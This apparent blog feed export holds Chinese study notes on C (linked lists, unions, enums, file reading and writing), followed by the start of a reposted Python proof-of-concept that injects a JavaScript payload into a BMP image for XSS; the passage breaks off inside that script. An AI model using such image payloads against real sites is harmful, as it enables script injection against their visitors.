class="line">        p = p-&gt;pnext; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">初始化变量 sum 为 0。</span></span><br><span class="line"><span class="comment">将 p 指针指向链表的第一个有效节点，即指向节点 1。</span></span><br><span class="line"><span class="comment">进入循环。由于节点 1 不为 NULL，执行循环体。</span></span><br><span class="line"><span class="comment">sum 的值增加 1，现在 sum 的值为 1。</span></span><br><span class="line"><span class="comment">将 p 指针移动到下一个节点，即节点 2。</span></span><br><span class="line"><span class="comment">进入下一次循环。由于节点 2 不为 NULL，执行循环体。</span></span><br><span class="line"><span class="comment">sum 的值增加 1，现在 sum 的值为 2。</span></span><br><span class="line"><span class="comment">将 p 指针移动到下一个节点，即节点 3。</span></span><br><span class="line"><span class="comment">进入下一次循环。由于节点 3 不为 NULL，执行循环体。</span></span><br><span class="line"><span class="comment">sum 的值增加 1，现在 sum 的值为 3。</span></span><br><span class="line"><span class="comment">将 p 指针移动到下一个节点，即节点 4。</span></span><br><span class="line"><span class="comment">进入下一次循环。由于节点 4 不为 NULL，执行循环体。</span></span><br><span class="line"><span class="comment">sum 的值增加 1，现在 sum 的值为 4。</span></span><br><span class="line"><span class="comment">将 p 指针移动到下一个节点，即 NULL。</span></span><br><span class="line"><span class="comment">退出循环。由于 p 指针为 NULL，不满足循环条件，循环结束。</span></span><br><span class="line"><span class="comment">返回 sum 的值，即 4。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">del</span><span class="params">(P phead ,<span class="keyword">int</span> index)</span></span>&#123;<span class="comment">//删除函数</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt;= <span class="number">0</span> || index &gt; len(phead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; index; ++i) &#123;</span><br><span class="line">        phead = phead-&gt;pnext;<span class="comment">//这个时候的phead值就是我们要删除的节点的前一个节点的地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    P tmp = phead-&gt;pnext-&gt;pnext;<span class="comment">//保存要删除的节点的下一个节点</span></span><br><span class="line">    <span class="built_in">free</span>(phead-&gt;pnext);<span class="comment">//释放要删除的节点</span></span><br><span class="line">    phead-&gt;pnext = tmp;<span class="comment">//将删除的节点前后链接上</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">insert</span><span class="params">(P phead, <span class="keyword">int</span> index, <span class="keyword">int</span> value)</span> </span>&#123;<span class="comment">//插入函数</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt;= <span class="number">0</span> || index &gt;= len(phead) + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//判断index是否合法</span></span><br><span class="line">    &#125;</span><br><span class="line">    P pnew = (P)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(N));<span class="comment">//给新的节点分配内存空间</span></span><br><span class="line">    <span class="keyword">if</span> (pnew == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pnew-&gt;data = value;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; index; ++i) &#123;</span><br><span class="line">        phead = phead-&gt;pnext;<span class="comment">//这个时候的phead值就是我们要增加的节点的前一个节点的地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    P tmp = phead-&gt;pnext;<span class="comment">//保存要增加的节点的下一个节点</span></span><br><span class="line">    phead-&gt;pnext = pnew;<span class="comment">//把上一个节点的pnext指向新的pnew</span></span><br><span class="line">    pnew-&gt;pnext = tmp;<span class="comment">//前一个节点的pnext值赋值给增加点节点的pnext</span></span><br><span class="line">    <span class="comment">//完成</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    P phead = create(); <span class="comment">// 创建链表头节点</span></span><br><span class="line">    input(phead, <span class="number">1</span>); <span class="comment">// 添加节点到链表中</span></span><br><span class="line">    input(phead, <span class="number">2</span>);</span><br><span class="line">    input(phead, <span class="number">3</span>);</span><br><span class="line">    input(phead, <span class="number">4</span>);</span><br><span class="line">    show(phead); <span class="comment">// 展示链表中的数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此链表中含有的有效数据个数是：%d\n&quot;</span>, len(phead));</span><br><span class="line">    <span class="keyword">if</span> (del(phead, <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show(phead);<span class="comment">//删除后的</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此链表中含有的有效数据个数是：%d\n&quot;</span>, len(phead));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (insert(phead, <span class="number">3</span>, <span class="number">5</span>)) &#123;<span class="comment">//在3原来的地方插入一个5</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;插入成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;插入失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show(phead);<span class="comment">//增加后的</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此链表中含有的有效数据个数是：%d\n&quot;</span>, len(phead));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>理一下就清楚了，我已经加上了详细的注释，很简单滴~输出如下</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230829095836822.png" alt="image-20230829095836822"></p>
<h2 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h2><p>共用体又称联合体，使用覆盖技术，几个变量相互覆盖，从而使几个不同变量共占同一段内存的结构。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Data</span> &#123;</span><span class="comment">//定义了一个共用体Data</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">double</span> f;<span class="comment">//里面是成员表列</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Data</span> <span class="title">a</span>;</span></span><br><span class="line">    <span class="comment">//a = 3; 不可以直接用一个基本类型的数据对共用体变量赋值</span></span><br><span class="line">    a.i = <span class="number">3</span>;<span class="comment">//这个就是可以的</span></span><br><span class="line">    a.ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a.i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, a.ch);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是，共用体的所有成员所使用的内存的开头地址的值都是一样的，所以当我们对其中一个成员赋值时，会把这个变量中原油数据诶给覆盖掉。举个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n%d\n&quot;</span>, a.ch,a.i);<span class="comment">//就会输出垃圾值</span></span><br></pre></td></tr></table></figure>

<p>我这个编译器不会输出垃圾值啊，但是我看的视频的老师用的编译器会输出垃圾值。</p>
<p>共用体特征：</p>
<p>1.共用体变量的地址和长度必须被其最宽基本类型成员的大小所整除。</p>
<p>2.其总长度必须大于等于最宽成员的长度。</p>
<p>（注意一个是最宽基本类型一个是最宽）</p>
<h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><p>1.指将变量的值一一列出来，变量的值只限于列举出来的值的范围内。</p>
<p>2.定义枚举类型的一般形式，<code>enum 枚举名 &#123;枚举元素表列&#125; 枚举变量表列;</code></p>
<p>可以定义在函数内部或者函数外部，枚举名和枚举变量至少有一个即可。如果有变量，可以对变量进行初始化，定义枚举元素时也可显示的指定数值。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">A</span> &#123;</span>a1,a2,a3,a4&#125;;<span class="comment">//c语言在定义的时候会根据这些元素的顺序定义一个默认值，分别为0.1.。。。。</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">B</span> &#123;</span> b1=<span class="number">3</span>, b2, b3, b4=<span class="number">5</span> &#125;;<span class="comment">//定义枚举类型的时候可以为枚举元素指定一个值，为指定值的元素将是前一个元素+1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">A</span> <span class="title">w</span> =</span> a2;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">B</span> <span class="title">w2</span> =</span> b2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>, a2, a3, b2);<span class="comment">//输出124</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>a2</code>是<code>enum A</code>类型的常量，所以既然是常量，就不可能中途改变它的值。</p>
<p>下面是枚举类型的定义</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831104644775.png" alt="image-20230831104644775"></p>
<h1 id="第十章-文件的输入输出"><a href="#第十章-文件的输入输出" class="headerlink" title="第十章 文件的输入输出"></a>第十章 文件的输入输出</h1><h2 id="文件的基本概念"><a href="#文件的基本概念" class="headerlink" title="文件的基本概念"></a>文件的基本概念</h2><p>一般把文件分为以下两个类别：</p>
<p>1.程序文件，这种文件的内容是程序代码。如源程序文件，目标文件，可执行文件等。</p>
<p>2.数据文件，其内容不是程序，而是提供程序运行时读写的数据。</p>
<p>注：所谓文件一般指存储在外部介质（如磁盘）上数据的集合。</p>
<p>终端即计算机的各种输入输出设备。操作系统把终端都统一作为文件来处理。例如：终端键盘是输入文件，显示屏和打印机是输出文件。</p>
<p><strong>下面讲讲文件名</strong></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831105058913.png" alt="image-20230831105058913"></p>
<p>这是常识把，这个都不知道的立即推，退出安全圈。</p>
<h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a><strong>数据文件</strong></h3><p>1.分类：ASCII文件（文本文件）和二进制文件（镜像文件）。存取一个二进制文件不需要转换，存取一个文本文件需要转换。如下，用16来举例子</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831105757932.png" alt="image-20230831105757932"></p>
<p>2.数据从源到目的端的流动称为数据流</p>
<p>3.数据流按读写数据的类型值不同分为两种：字节流和字符流。两者的区别就是读写的时候一个是按字节读写，一个是按字符。</p>
<p>按照源和目的段的不同可分为：输入流（文件流向内存）和输出流（内存流向文件）和缓冲流。</p>
<h3 id="文件缓冲区"><a href="#文件缓冲区" class="headerlink" title="文件缓冲区"></a>文件缓冲区</h3><p>C90采用<strong>缓冲文件系统</strong>处理数据文件，所谓缓冲文件系统是指系统自动地在内存区为程序中一些正在使用的文件开辟一个文件缓冲区。比如说：从内存向磁盘输出数据，可能会先送到内存的缓冲区中，装满缓冲区或者缓冲区被刷新后在一起送到磁盘去。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831134645007.png" alt="image-20230831134645007"></p>
<h3 id="文件类型指针"><a href="#文件类型指针" class="headerlink" title="文件类型指针"></a>文件类型指针</h3><p>1.每个被使用的文件都在内存中开辟一个响应的文件信息去，用来存放文件的有关信息。这些信息是保存在一个结构体变量中。给结构体是由系统声明，取名为<code>FILE(在stdio.h中声明)</code>。</p>
<p>2.我们可以定义一个FILE类型的指针，然后使该指针指向某一个文件的文件信息区，那么我们就可以访问这个文件了。</p>
<h3 id="文件的函数"><a href="#文件的函数" class="headerlink" title="文件的函数"></a>文件的函数</h3><p><strong><code>fopen</code></strong></p>
<p>1.打开是指为文件建立相应的信息区和文件缓冲区。</p>
<p>2.使用fopen打开文件，fopen的调用方式为:<code>fopen(文件名,使用文件方式);</code>这个就和python里的fopen几乎一模一样啊喂！</p>
<p>如<code>FILE *fp = fopen(&quot;a1&quot;,&quot;r&quot;);</code></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831135539927.png" alt="image-20230831135539927"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831135715227.png" alt="image-20230831135715227"></p>
<p><strong><code>fclose</code></strong></p>
<p>1.关闭是指撤销文件信息区和文件缓冲区。</p>
<p>2.使用<code>fclose(文件指针)</code>关闭数据文件。其作用就是把关闭文件指针所指向的文件关闭。</p>
<p>注：1.如果不关闭文件将会丢失数据。</p>
<p>因为我们向文件写数据时，缓冲区未充满而程序结束，就有可能使缓冲区中的数据丢失。而使用fclose函数关闭文件，会先把缓冲区中的数据输出到磁盘，然后才撤销文件信息区。</p>
<p>2.fclose成功执行之了关闭操作返回0，否则返回<code>EOF(-1)</code></p>
<p><strong><code>向文件读写字符</code></strong></p>
<p>这里用一个例子解释，读入一个文本文件并把其内容输出到一个新的文本文件中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>] = <span class="string">&quot;C:\\工具\\临时存放\\读.txt&quot;</span>;<span class="comment">//中间记得转义，当然直接用一个正斜杠也可以</span></span><br><span class="line">    FILE* fp = fopen(name, <span class="string">&quot;r&quot;</span>);<span class="comment">//打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;文件打开失败，程序退出&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp2 = fopen(<span class="string">&quot;C:\\工具\\临时存放\\写.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;文件打开失败，程序退出&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> ((ch = fgetc(fp)) != EOF) &#123;<span class="comment">//while中的条件是检测是否读取到文件末尾或者是否出错</span></span><br><span class="line">        <span class="comment">//fgerc就是读取函数</span></span><br><span class="line">        fputc(ch, fp2);<span class="comment">//将读取到的内容存到fp2中</span></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    fclose(fp2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831143836674.png" alt="image-20230831143836674"></p>
<p>成功创建名字为写的文件。</p>
<p>下面是值得注意点两点</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831144050172.png" alt="image-20230831144050172"></p>
<h2 id="用格式化的方式读写文件"><a href="#用格式化的方式读写文件" class="headerlink" title="用格式化的方式读写文件"></a>用格式化的方式读写文件</h2><p>1.1.printf和scanf函数是向终端进行格式话的输入和输出。如果向文件进行格式化输入输出需要用到fprintf和fscanf函数。调用方式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(文件指针，格式字符串，输出列表);</span><br><span class="line">fscaf(文件指针，格式字符串，输出列表)；</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    FILE* p1 = fopen(<span class="string">&quot;C:\\工具\\临时存放\\读.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    FILE* p2 = fopen(<span class="string">&quot;C:\\工具\\临时存放\\写.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">fscanf</span>(p1, <span class="string">&quot;%s&quot;</span>, c);<span class="comment">//读取文件中的字符存到c数组中去</span></span><br><span class="line">    <span class="built_in">fprintf</span> (p2,<span class="string">&quot;%s&quot;</span>, c);<span class="comment">//将c数组的东西输出到p2文件中去</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831152549715.png" alt="image-20230831152549715"></p>
<p>成功</p>
<h2 id="用二进制的方式读写文件"><a href="#用二进制的方式读写文件" class="headerlink" title="用二进制的方式读写文件"></a>用二进制的方式读写文件</h2><p>用到<code>fprintf</code>和<code>fscanf</code>函数的时候，输入时要讲文件中的ASCII码转换成二进制形式保存在内存变量中，在输出时又要将内存中的二进制转换成字符，要花费较多的时间。</p>
<p>所以一般来说我们使用二进制的方式来读写文件</p>
<p><code>fread</code>和<code>fwrite</code>函数</p>
<p><code>fread(buffer,size,count,fp)</code>:从fp所指向的文件中读取数据，最多读取count个项，每个项size个字节，并把这些数据存放到以buffer为地址开头的内存块中，如果调用成功返回实际读取到的的项个数，如果不成功或一开始读取到文件末尾返回0。</p>
<p> ：把以buffer为地址开头的内存块的count个项的size个字节的数据写入fp中所指向的文件中。返回实际写入的数据项个数count。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">&#125;Stu;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    Stu a[<span class="number">3</span>] = &#123; &#123;<span class="string">&quot;zhangsan&quot;</span>,<span class="number">89.5</span>&#125;,&#123;<span class="string">&quot;lisi&quot;</span>,<span class="number">78</span>&#125;,&#123;<span class="string">&quot;wangwu&quot;</span>,<span class="number">90.1</span>&#125;&#125;;<span class="comment">//初始化了一个结构体数组</span></span><br><span class="line">    FILE* p1 = fopen(<span class="string">&quot;C:\\工具\\临时存放\\写.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(a, <span class="keyword">sizeof</span>(Stu), <span class="number">3</span>, p1);<span class="comment">//fwrite(buffer,size,count,fp)</span></span><br><span class="line">    fclose(p1);</span><br><span class="line">    p1 = <span class="literal">NULL</span>;<span class="comment">//防止出现野指针</span></span><br><span class="line"></span><br><span class="line">    FILE* p2 = fopen(<span class="string">&quot;C:\\工具\\临时存放\\写.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//读取文件</span></span><br><span class="line">    Stu b[<span class="number">3</span>];</span><br><span class="line">    fread(b, <span class="keyword">sizeof</span>(Stu), <span class="number">3</span>, p2);<span class="comment">//从p2指向的文件中读入数据，放到b中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个,姓名：%s，分数：%lf\n&quot;</span>, i + <span class="number">1</span>, b[i].name, b[i].score);<span class="comment">//输出b中的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(p2);</span><br><span class="line">    p2 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831154520885.png" alt="image-20230831154520885"></p>
<h2 id="文件读写的注意事项"><a href="#文件读写的注意事项" class="headerlink" title="文件读写的注意事项"></a>文件读写的注意事项</h2><p>1.在windows中，文本已”\r\n”代表换行。也就是是两个字符表示换行。</p>
<p>你fputs写入换行符\n的时候，函数会自动在\n面前加上\r。</p>
<p>二进制的换行符就是\n</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831155002419.png" alt="image-20230831155002419"></p>
<h2 id="随机读写数据"><a href="#随机读写数据" class="headerlink" title="随机读写数据"></a>随机读写数据</h2><p>1.随机读写数据不是按照数据在文件中的物理次序进行读写。而是可以对任何位置上的数据进行访问。显然这种方式比顺序访问效率高得多。</p>
<p>2.文件位置标记简称文件标记，用来指示“接下来要读写的下一个字符的位置”</p>
<p>3.<code>rewind(fp);</code>：使fp所指向的文件的文件标记到文件的开头位置，此函数没有返回值。</p>
<p>4.<code>fseek(文件类型指针,位移量,起始点;)</code>可改变文件标记，执行成功返回0，否则返回非0值。</p>
<p>下面是一个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;C:\\工具\\临时存放\\读.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;文件打开失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：使用 rewind(fp) 将文件指针设置为开头位置</span></span><br><span class="line">    rewind(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：使用 fseek(fp, offset, origin) 将文件指针定位到相应位置</span></span><br><span class="line">    fseek(fp, <span class="number">10</span>, SEEK_SET); <span class="comment">// 将文件指针定位到距离开头位置 10 个字节的位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他操作...</span></span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230831160856068.png" alt="image-20230831160856068"></p>
<p>注意，使用<code>fseek()</code>函数定位文件指针时要确保文件是以对应的模式（如”r”或”w”）打开的，否则可能会引发错误。</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>gifxss</title>
    <url>/2022/03/04/gifxss/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25280410">浅析图片XSS中的哪些技术问题 - 知乎 (zhihu.com)</a></p>
<p>转载一篇博客</p>
<p>方便日后查阅</p>
<p>bmpxss</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#============================================================================================================#</span></span><br><span class="line"><span class="comment">#======= Simply injects a JavaScript Payload into a BMP. ====================================================#</span></span><br><span class="line"><span class="comment">#======= The resulting BMP must be a valid (not corrupted) BMP. =============================================#</span></span><br><span class="line"><span class="comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span></span><br><span class="line"><span class="comment">#======= Version: PoC (don&#x27;t even think to use it in development env.) ======================================#</span></span><br><span class="line"><span class="comment">#======= Disclaimer: ========================================================================================#</span></span><br><span class="line"><span class="comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &quot;AS IS&quot; AND ANY EXPRESS OR</span></span><br><span class="line"><span class="comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span></span><br><span class="line"><span class="comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line">								<span class="comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span></span><br><span class="line">								<span class="comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span></span><br><span class="line"><span class="comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span></span><br><span class="line"><span class="comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment">#POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">#===========================================================================================================#</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hexify</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Converts and formats to hexadecimal</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	num = <span class="string">&quot;%x&quot;</span> % num</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(num) % <span class="number">2</span>:</span><br><span class="line">		num = <span class="string">&#x27;0&#x27;</span>+num</span><br><span class="line">	<span class="keyword">return</span> num.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="comment">#Example payload: &quot;var _0xe428=[\&quot;&quot;+ b&#x27;\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64&#x27; + &quot;\&quot;]</span></span><br><span class="line"><span class="comment">#;alert(_0xe428[0]);&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_and_write_to_file</span>(<span class="params">payload, 